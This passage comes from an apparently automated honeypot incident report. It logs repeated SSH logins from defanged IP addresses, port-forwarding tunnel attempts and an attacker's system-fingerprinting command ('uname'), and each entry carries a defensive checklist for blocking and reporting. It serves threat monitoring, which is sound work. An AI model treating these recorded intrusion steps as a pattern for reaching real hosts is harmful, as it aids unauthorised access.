- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73b6f49c8760

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-03-16 02:51 |
| **Last Seen** | 2026-03-16 02:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:51:51` | `cowrie.session.connect` |
| `2026-03-16 02:51:52` | `cowrie.client.version` |
| `2026-03-16 02:51:52` | `cowrie.client.kex` |
| `2026-03-16 02:51:53` | `cowrie.login.success` |
| `2026-03-16 02:51:54` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd33147eb3b

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]171` |
| **First Seen** | 2026-03-16 02:52 |
| **Last Seen** | 2026-03-16 02:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:52:03` | `cowrie.session.connect` |
| `2026-03-16 02:52:03` | `cowrie.client.version` |
| `2026-03-16 02:52:03` | `cowrie.client.kex` |
| `2026-03-16 02:52:04` | `cowrie.login.success` |
| `2026-03-16 02:52:04` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]171` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c6c7dd69519

| Field | Detail |
|---|---|
| **Source IP** | `122.170.111[.]140` |
| **First Seen** | 2026-03-16 02:52 |
| **Last Seen** | 2026-03-16 02:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:52:03` | `cowrie.session.connect` |
| `2026-03-16 02:52:03` | `cowrie.client.version` |
| `2026-03-16 02:52:03` | `cowrie.client.kex` |
| `2026-03-16 02:52:04` | `cowrie.login.success` |
| `2026-03-16 02:52:05` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.111[.]140` to AbuseIPDB if not already reported
- [ ] Block `122.170.111[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd116bd4d509

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-03-16 02:52 |
| **Last Seen** | 2026-03-16 02:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:52:51` | `cowrie.session.connect` |
| `2026-03-16 02:52:52` | `cowrie.client.version` |
| `2026-03-16 02:52:52` | `cowrie.client.kex` |
| `2026-03-16 02:52:54` | `cowrie.login.success` |
| `2026-03-16 02:52:55` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d90b6c53c96

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:04 |
| **Last Seen** | 2026-03-16 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:04:29` | `cowrie.session.connect` |
| `2026-03-16 04:04:29` | `cowrie.client.version` |
| `2026-03-16 04:04:29` | `cowrie.client.kex` |
| `2026-03-16 04:04:30` | `cowrie.login.success` |
| `2026-03-16 04:04:30` | `cowrie.session.params` |
| `2026-03-16 04:04:30` | `cowrie.command.input` |
| `2026-03-16 04:04:30` | `cowrie.log.closed` |
| `2026-03-16 04:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49345ee1c7d6

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:04 |
| **Last Seen** | 2026-03-16 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:04:43` | `cowrie.session.connect` |
| `2026-03-16 04:04:43` | `cowrie.client.version` |
| `2026-03-16 04:04:43` | `cowrie.client.kex` |
| `2026-03-16 04:04:44` | `cowrie.login.success` |
| `2026-03-16 04:04:44` | `cowrie.session.params` |
| `2026-03-16 04:04:44` | `cowrie.command.input` |
| `2026-03-16 04:04:44` | `cowrie.log.closed` |
| `2026-03-16 04:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a720090bc1f4

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:04 |
| **Last Seen** | 2026-03-16 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:04:50` | `cowrie.session.connect` |
| `2026-03-16 04:04:50` | `cowrie.client.version` |
| `2026-03-16 04:04:50` | `cowrie.client.kex` |
| `2026-03-16 04:04:50` | `cowrie.login.success` |
| `2026-03-16 04:04:51` | `cowrie.session.params` |
| `2026-03-16 04:04:51` | `cowrie.command.input` |
| `2026-03-16 04:04:51` | `cowrie.log.closed` |
| `2026-03-16 04:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f38f7793c0f

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:05 |
| **Last Seen** | 2026-03-16 04:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:05:03` | `cowrie.session.connect` |
| `2026-03-16 04:05:03` | `cowrie.client.version` |
| `2026-03-16 04:05:03` | `cowrie.client.kex` |
| `2026-03-16 04:05:04` | `cowrie.login.success` |
| `2026-03-16 04:05:05` | `cowrie.session.params` |
| `2026-03-16 04:05:05` | `cowrie.command.input` |
| `2026-03-16 04:05:05` | `cowrie.log.closed` |
| `2026-03-16 04:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336f36e14dd0

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:06 |
| **Last Seen** | 2026-03-16 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:06:36` | `cowrie.session.connect` |
| `2026-03-16 04:06:36` | `cowrie.client.version` |
| `2026-03-16 04:06:36` | `cowrie.client.kex` |
| `2026-03-16 04:06:37` | `cowrie.login.success` |
| `2026-03-16 04:06:37` | `cowrie.session.params` |
| `2026-03-16 04:06:37` | `cowrie.command.input` |
| `2026-03-16 04:06:37` | `cowrie.log.closed` |
| `2026-03-16 04:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c537c4318a6

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:06 |
| **Last Seen** | 2026-03-16 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:06:49` | `cowrie.session.connect` |
| `2026-03-16 04:06:49` | `cowrie.client.version` |
| `2026-03-16 04:06:49` | `cowrie.client.kex` |
| `2026-03-16 04:06:50` | `cowrie.login.success` |
| `2026-03-16 04:06:50` | `cowrie.session.params` |
| `2026-03-16 04:06:50` | `cowrie.command.input` |
| `2026-03-16 04:06:50` | `cowrie.log.closed` |
| `2026-03-16 04:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59043cf74a5

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:06 |
| **Last Seen** | 2026-03-16 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:06:55` | `cowrie.session.connect` |
| `2026-03-16 04:06:55` | `cowrie.client.version` |
| `2026-03-16 04:06:56` | `cowrie.client.kex` |
| `2026-03-16 04:06:56` | `cowrie.login.success` |
| `2026-03-16 04:06:57` | `cowrie.session.params` |
| `2026-03-16 04:06:57` | `cowrie.command.input` |
| `2026-03-16 04:06:57` | `cowrie.log.closed` |
| `2026-03-16 04:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef53f90ff450

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:07 |
| **Last Seen** | 2026-03-16 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:07:02` | `cowrie.session.connect` |
| `2026-03-16 04:07:02` | `cowrie.client.version` |
| `2026-03-16 04:07:02` | `cowrie.client.kex` |
| `2026-03-16 04:07:03` | `cowrie.login.success` |
| `2026-03-16 04:07:03` | `cowrie.session.params` |
| `2026-03-16 04:07:03` | `cowrie.command.input` |
| `2026-03-16 04:07:04` | `cowrie.log.closed` |
| `2026-03-16 04:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a3b3b7dff35

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:07 |
| **Last Seen** | 2026-03-16 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:07:15` | `cowrie.session.connect` |
| `2026-03-16 04:07:15` | `cowrie.client.version` |
| `2026-03-16 04:07:16` | `cowrie.client.kex` |
| `2026-03-16 04:07:17` | `cowrie.login.success` |
| `2026-03-16 04:07:17` | `cowrie.session.params` |
| `2026-03-16 04:07:17` | `cowrie.command.input` |
| `2026-03-16 04:07:17` | `cowrie.log.closed` |
| `2026-03-16 04:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fbdad9b18b

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:07 |
| **Last Seen** | 2026-03-16 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:07:29` | `cowrie.session.connect` |
| `2026-03-16 04:07:29` | `cowrie.client.version` |
| `2026-03-16 04:07:29` | `cowrie.client.kex` |
| `2026-03-16 04:07:29` | `cowrie.login.success` |
| `2026-03-16 04:07:30` | `cowrie.session.params` |
| `2026-03-16 04:07:30` | `cowrie.command.input` |
| `2026-03-16 04:07:30` | `cowrie.log.closed` |
| `2026-03-16 04:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9bc37e7e8ae

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:08 |
| **Last Seen** | 2026-03-16 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:08:41` | `cowrie.session.connect` |
| `2026-03-16 04:08:41` | `cowrie.client.version` |
| `2026-03-16 04:08:41` | `cowrie.client.kex` |
| `2026-03-16 04:08:42` | `cowrie.login.success` |
| `2026-03-16 04:08:42` | `cowrie.session.params` |
| `2026-03-16 04:08:42` | `cowrie.command.input` |
| `2026-03-16 04:08:42` | `cowrie.log.closed` |
| `2026-03-16 04:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daea4b2b9874

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:09 |
| **Last Seen** | 2026-03-16 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:09:14` | `cowrie.session.connect` |
| `2026-03-16 04:09:14` | `cowrie.client.version` |
| `2026-03-16 04:09:14` | `cowrie.client.kex` |
| `2026-03-16 04:09:15` | `cowrie.login.success` |
| `2026-03-16 04:09:15` | `cowrie.session.params` |
| `2026-03-16 04:09:15` | `cowrie.command.input` |
| `2026-03-16 04:09:15` | `cowrie.log.closed` |
| `2026-03-16 04:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-717aeac488c6

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:09 |
| **Last Seen** | 2026-03-16 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:09:27` | `cowrie.session.connect` |
| `2026-03-16 04:09:27` | `cowrie.client.version` |
| `2026-03-16 04:09:27` | `cowrie.client.kex` |
| `2026-03-16 04:09:28` | `cowrie.login.success` |
| `2026-03-16 04:09:28` | `cowrie.session.params` |
| `2026-03-16 04:09:28` | `cowrie.command.input` |
| `2026-03-16 04:09:28` | `cowrie.log.closed` |
| `2026-03-16 04:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a070cc09c7d4

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:09 |
| **Last Seen** | 2026-03-16 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:09:33` | `cowrie.session.connect` |
| `2026-03-16 04:09:33` | `cowrie.client.version` |
| `2026-03-16 04:09:34` | `cowrie.client.kex` |
| `2026-03-16 04:09:34` | `cowrie.login.success` |
| `2026-03-16 04:09:35` | `cowrie.session.params` |
| `2026-03-16 04:09:35` | `cowrie.command.input` |
| `2026-03-16 04:09:35` | `cowrie.log.closed` |
| `2026-03-16 04:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c6d105fadb

| Field | Detail |
|---|---|
| **Source IP** | `147.182.140[.]188` |
| **First Seen** | 2026-03-16 04:09 |
| **Last Seen** | 2026-03-16 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:09:53` | `cowrie.session.connect` |
| `2026-03-16 04:09:53` | `cowrie.client.version` |
| `2026-03-16 04:09:53` | `cowrie.client.kex` |
| `2026-03-16 04:09:54` | `cowrie.login.success` |
| `2026-03-16 04:09:54` | `cowrie.session.params` |
| `2026-03-16 04:09:54` | `cowrie.command.input` |
| `2026-03-16 04:09:55` | `cowrie.log.closed` |
| `2026-03-16 04:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.140[.]188` to AbuseIPDB if not already reported
- [ ] Block `147.182.140[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87aa37b33067

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 04:59 |
| **Last Seen** | 2026-03-16 04:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:59:21` | `cowrie.session.connect` |
| `2026-03-16 04:59:21` | `cowrie.client.version` |
| `2026-03-16 04:59:21` | `cowrie.client.kex` |
| `2026-03-16 04:59:25` | `cowrie.login.success` |
| `2026-03-16 04:59:30` | `cowrie.session.params` |
| `2026-03-16 04:59:30` | `cowrie.command.input` |
| `2026-03-16 04:59:31` | `cowrie.log.closed` |
| `2026-03-16 04:59:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d20115af328

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 04:59 |
| **Last Seen** | 2026-03-16 04:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:59:37` | `cowrie.session.connect` |
| `2026-03-16 04:59:37` | `cowrie.client.version` |
| `2026-03-16 04:59:37` | `cowrie.client.kex` |
| `2026-03-16 04:59:38` | `cowrie.login.success` |
| `2026-03-16 04:59:39` | `cowrie.session.params` |
| `2026-03-16 04:59:39` | `cowrie.command.input` |
| `2026-03-16 04:59:39` | `cowrie.log.closed` |
| `2026-03-16 04:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c86f9768620

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 04:59 |
| **Last Seen** | 2026-03-16 04:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:59:42` | `cowrie.session.connect` |
| `2026-03-16 04:59:42` | `cowrie.client.version` |
| `2026-03-16 04:59:42` | `cowrie.client.kex` |
| `2026-03-16 04:59:49` | `cowrie.login.success` |
| `2026-03-16 04:59:51` | `cowrie.session.params` |
| `2026-03-16 04:59:51` | `cowrie.command.input` |
| `2026-03-16 04:59:51` | `cowrie.log.closed` |
| `2026-03-16 04:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2305064d91f5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 04:59 |
| **Last Seen** | 2026-03-16 04:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:59:44` | `cowrie.session.connect` |
| `2026-03-16 04:59:44` | `cowrie.client.version` |
| `2026-03-16 04:59:44` | `cowrie.client.kex` |
| `2026-03-16 04:59:46` | `cowrie.login.success` |
| `2026-03-16 04:59:47` | `cowrie.session.params` |
| `2026-03-16 04:59:47` | `cowrie.command.input` |
| `2026-03-16 04:59:47` | `cowrie.log.closed` |
| `2026-03-16 04:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465b2a99f6c5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 04:59 |
| **Last Seen** | 2026-03-16 04:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 04:59:56` | `cowrie.session.connect` |
| `2026-03-16 04:59:56` | `cowrie.client.version` |
| `2026-03-16 04:59:57` | `cowrie.client.kex` |
| `2026-03-16 04:59:57` | `cowrie.login.success` |
| `2026-03-16 04:59:58` | `cowrie.session.params` |
| `2026-03-16 04:59:58` | `cowrie.command.input` |
| `2026-03-16 04:59:58` | `cowrie.log.closed` |
| `2026-03-16 04:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28361b9fdd5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:00` | `cowrie.session.connect` |
| `2026-03-16 05:00:00` | `cowrie.client.version` |
| `2026-03-16 05:00:00` | `cowrie.client.kex` |
| `2026-03-16 05:00:02` | `cowrie.login.success` |
| `2026-03-16 05:00:03` | `cowrie.session.params` |
| `2026-03-16 05:00:03` | `cowrie.command.input` |
| `2026-03-16 05:00:03` | `cowrie.log.closed` |
| `2026-03-16 05:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.199[.]28` to AbuseIPDB if not already reported
- [ ] Block `120.48.199[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa0ded15ecb9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.199[.]28` |
| **First Seen** | 2026-03-16 05:00 |
| **Last Seen** | 2026-03-16 05:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r-m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 05:00:04` | `cowrie.session.connect` |
| `2026-03-16 05:00:04` | `cowrie.client.version` |
| `2026-03-16 05:00:05` | `cowrie.client.kex` |
